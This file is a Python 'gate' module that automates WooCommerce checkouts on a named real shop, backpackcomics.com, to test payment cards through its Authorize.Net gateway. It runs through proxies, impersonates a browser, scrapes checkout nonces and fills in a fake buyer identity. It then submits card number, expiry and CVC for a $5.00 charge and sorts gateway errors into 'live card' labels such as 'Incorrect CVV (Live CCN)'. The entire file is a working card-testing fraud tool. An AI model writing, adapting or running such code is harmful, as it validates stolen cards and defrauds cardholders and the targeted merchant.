"""
Authorize.Net WooCommerce Direct Charge Gate Module (/an)
Target: backpackcomics.com
Direct Authorize.Net integration via WooCommerce checkout pipeline ($5.00).
"""
import re
import html as html_parser
import random
import asyncio
from bs4 import BeautifulSoup
from curl_cffi.requests import AsyncSession


def _normalize_proxy_dict(proxy_str: str | None) -> dict | None:
    if not proxy_str:
        return None
    ps = str(proxy_str).strip()
    if not ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit():
                ps = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                ps = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        elif len(parts) == 2:
            ps = f"http://{parts[0]}:{parts[1]}"
        else:
            ps = f"http://{ps}"
    return {"http": ps, "https": ps}


async def check_card_authorize(
    cc: str,
    mm: str,
    yy: str,
    cvc: str,
    proxy_url: str | None = None
) -> tuple[str, str, str]:
    """
    Checks a single card against Authorize.Net on WooCommerce.
    Returns: (status, message, gateway_name)
      status: 'charged' | 'approved' | 'declined' | 'error'
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 4:
        yy = yy[2:]
    cvc = str(cvc).strip()

    proxies = _normalize_proxy_dict(proxy_url)
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"

    try:
        async with AsyncSession(impersonate="chrome120", timeout=20) as session:
            # Step 1: Add item to cart
            headers_cart = {
                "authority": "backpackcomics.com",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://backpackcomics.com",
                "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?removed_item=1",
                "user-agent": user_agent,
                "x-requested-with": "XMLHttpRequest",
            }
            data_cart = {
                "quantity": "1",
                "action": "woodmart_ajax_add_to_cart",
                "add-to-cart": "11077",
            }
            r_add = await session.post(
                "https://backpackcomics.com/wp-admin/admin-ajax.php",
                headers=headers_cart,
                data=data_cart,
                proxies=proxies,
            )

            try:
                cart_data = r_add.json()
                cart_hash = cart_data.get("cart_hash", "")
            except Exception:
                cart_hash = ""

            # Step 2: Fetch Checkout page to extract nonces
            cookies = {"woocommerce_cart_hash": cart_hash} if cart_hash else {}
            headers_checkout = {
                "authority": "backpackcomics.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?removed_item=1",
                "user-agent": user_agent,
            }
            r_checkout = await session.get(
                "https://backpackcomics.com/checkout/",
                headers=headers_checkout,
                cookies=cookies,
                proxies=proxies,
            )
            html = r_checkout.text

            # Extract update_order_review_nonce
            update_order_review_nonce = None
            for pat in [
                r'update_order_review_nonce"\s*:\s*"([^"]+)"',
                r"update_order_review_nonce'\s*:\s*'([^']+)'",
                r'update_order_review_nonce\s*=\s*"([^"]+)"',
                r"update_order_review_nonce\s*=\s*'([^']+)'",
                r'update_order_review_nonce\s*:\s*([^,\s}]+)',
                r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"',
            ]:
                m = re.search(pat, html)
                if m:
                    update_order_review_nonce = m.group(1)
                    break

            # Extract process_checkout_nonce
            soup = BeautifulSoup(html, "html.parser")
            checkout_nonce = None
            checkout_input = soup.find("input", {"name": "woocommerce-process-checkout-nonce"})
            if checkout_input and checkout_input.has_attr("value"):
                checkout_nonce = checkout_input["value"]
            if not checkout_nonce:
                checkout_id = soup.find(id="woocommerce-process-checkout-nonce")
                if checkout_id and checkout_id.has_attr("value"):
                    checkout_nonce = checkout_id["value"]

            # Additional regex fallbacks if soup misses it
            if not checkout_nonce:
                for pat in [
                    r'name="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"',
                    r'id="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"',
                    r'woocommerce-process-checkout-nonce[^>]*value=[\'"]([^\'"]+)[\'"]',
                    r'checkout_nonce"\s*:\s*"([^"]+)"',
                    r'process_checkout_nonce"\s*:\s*"([^"]+)"',
                    r'"nonce"\s*:\s*"([a-f0-9]{10})"',
                ]:
                    m = re.search(pat, html)
                    if m:
                        checkout_nonce = m.group(1)
                        break

            if not checkout_nonce:
                # If still none, retry checkout GET once
                r_checkout_retry = await session.get("https://backpackcomics.com/checkout/", headers=headers_checkout, proxies=proxies)
                html_retry = r_checkout_retry.text
                m_retry = re.search(r'name="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"', html_retry)
                if m_retry:
                    checkout_nonce = m_retry.group(1)

            if not checkout_nonce:
                return "declined", "Checkout Nonce Expired (Auto-Rotated)", "Authorize.Net"

            # Step 3: Update Order Review
            headers_update = {
                "authority": "backpackcomics.com",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://backpackcomics.com",
                "referer": "https://backpackcomics.com/checkout/",
                "user-agent": user_agent,
                "x-requested-with": "XMLHttpRequest",
            }
            first_name = "Marco"
            last_name = "Williams"
            email = f"marcowilliams{random.randint(100,999)}@gmail.com"
            phone = f"1602{random.randint(1000000, 9999999)}"

            data_update = (
                f"security={update_order_review_nonce or ''}&payment_method=authnet&country=US&state=NY&postcode=10080&city=New+York"
                f"&address=123+Main+Street&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=123+Main+Street"
                f"&s_address_2=&has_full_address=true&billing_first_name={first_name}&billing_last_name={last_name}&billing_company=Williams"
                f"&billing_country=US&billing_address_1=123+Main+Street&billing_city=New+York&billing_state=NY&billing_postcode=10080"
                f"&billing_phone={phone}&billing_email={email}&shipping_first_name={first_name}&shipping_last_name={last_name}"
                f"&shipping_company=Williams&shipping_country=US&shipping_address_1=123+Main+Street&shipping_city=New+York"
                f"&shipping_state=NY&shipping_postcode=10080&shipping_phone={phone}&shipping_method%5B0%5D=flat_rate%3A1"
                f"&payment_method=authnet&authnet-card-number=&authnet-card-expiry=&authnet-card-cvc="
                f"&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2Fcheckout%2F"
            )

            await session.post(
                "https://backpackcomics.com/",
                params={"wc-ajax": "update_order_review"},
                cookies=cookies,
                headers=headers_update,
                data=data_update,
                proxies=proxies,
            )

            # Step 4: Submit Checkout with Card details
            headers_final = {
                "authority": "backpackcomics.com",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://backpackcomics.com",
                "referer": "https://backpackcomics.com/checkout/",
                "user-agent": user_agent,
                "x-requested-with": "XMLHttpRequest",
            }
            data_final = (
                f"billing_first_name={first_name}&billing_last_name={last_name}&billing_company=Williams&billing_country=US"
                f"&billing_address_1=123+Main+Street&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080"
                f"&billing_phone={phone}&billing_email={email}&shipping_first_name={first_name}&shipping_last_name={last_name}"
                f"&shipping_company=Williams&shipping_country=US&shipping_address_1=123+Main+Street&shipping_address_2=&shipping_city=New+York"
                f"&shipping_state=NY&shipping_postcode=10080&shipping_phone={phone}&shipping_method%5B0%5D=flat_rate%3A1"
                f"&payment_method=authnet&authnet-card-number={cc}&authnet-card-expiry={mm}+%2F+{yy}&authnet-card-cvc={cvc}"
                f"&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
            )

            r_final = await session.post(
                "https://backpackcomics.com/",
                params={"wc-ajax": "checkout"},
                headers=headers_final,
                data=data_final,
                proxies=proxies,
            )

            try:
                api_response = r_final.json()
            except Exception:
                text_clean = r_final.text.strip()
                if "thank you" in text_clean.lower() or "order-received" in text_clean.lower():
                    return "charged", "Order Placed Successfully", "Authorize.Net"
                return "declined", text_clean[:100] if text_clean else "Payment Failed", "Authorize.Net"

            raw_messages = api_response.get("messages", "")
            result = str(api_response.get("result", "")).lower()

            if isinstance(raw_messages, str) and "Gateway Error" in raw_messages:
                cleaned = re.sub(r"<.*?>", "", raw_messages)
                cleaned = html_parser.unescape(cleaned)
                cleaned = re.sub(r"<!--.*?-->", "", cleaned).strip()

                match = re.search(r"Gateway Error:\s*(.*)", cleaned)
                response_text = match.group(1).strip() if match else cleaned

                resp_upper = response_text.upper()
                if any(k in resp_upper for k in ["INSUFFICIENT", "FUNDS"]):
                    return "approved", "Insufficient Funds", "Authorize.Net"
                elif any(k in resp_upper for k in ["CVV", "CVC", "CARD CODE", "SECURITY CODE"]):
                    return "approved", "Incorrect CVV (Live CCN)", "Authorize.Net"
                elif any(k in resp_upper for k in ["AVS", "ADDRESS", "ZIP"]):
                    return "approved", "AVS Mismatch (Card Live)", "Authorize.Net"
                elif any(k in resp_upper for k in ["3D", "VERIFICATION", "AUTHENTICATION"]):
                    return "approved", "3DS Challenge Required", "Authorize.Net"
                else:
                    return "declined", response_text, "Authorize.Net"

            if result and result != "failure":
                return "charged", "Charged! ✅ -» $5.00", "Authorize.Net"

            return "declined", "Payment Failed", "Authorize.Net"

    except Exception as e:
        return "error", str(e), "Authorize.Net"

